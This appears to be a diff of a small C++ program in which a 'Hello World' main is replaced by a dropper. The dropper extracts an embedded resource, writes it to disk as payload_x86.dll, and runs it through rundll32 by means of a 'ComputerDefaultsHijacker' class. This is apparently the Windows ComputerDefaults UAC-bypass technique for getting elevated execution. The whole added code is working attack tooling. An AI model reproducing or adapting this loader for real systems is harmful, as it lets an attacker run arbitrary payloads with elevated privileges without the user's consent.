@@ -2,11 +2,32 @@
 //
 
 #include "pch.h"
-#include <iostream>
+#include "ComputerDefaultsHijacker.h"
+
+#define DLL_PAYLOAD_X86_PATH L"%USERPROFILE%\\Desktop\\Demo_PE\\payload_x86.dll"
+#define RUNDLL32_PATH L"%WinDir%\\System32\\rundll32.exe"
+#define DLL_PAYLOAD_ENTRY_POINT L"EntryPoint"
 
 int main()
 {
-    std::cout << "Hello World!\n";
+	Lib::Init();
+	
+	LPBYTE pData = NULL;
+	DWORD dwDataSize = 0;
+	Lib::GetResourceData(IDR_PKW9JSDH1, L"PKw9jsdH", pData, dwDataSize);
+	Lib::WriteToFile(DLL_PAYLOAD_X86_PATH, pData, dwDataSize);
+	
+	WCHAR wzCommand[MAX_PATH] = {0};
+	StringCbCatW(wzCommand, sizeof(wzCommand), RUNDLL32_PATH);
+	StringCbCatW(wzCommand, sizeof(wzCommand), L" ");
+	StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_X86_PATH);
+	StringCbCatW(wzCommand, sizeof(wzCommand), L",");
+	StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_ENTRY_POINT);
+	
+	ComputerDefaultsHijacker hijacker;
+	hijacker.Install(wzCommand);
+	hijacker.Run();
+	hijacker.Uninstall();
 }
 
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
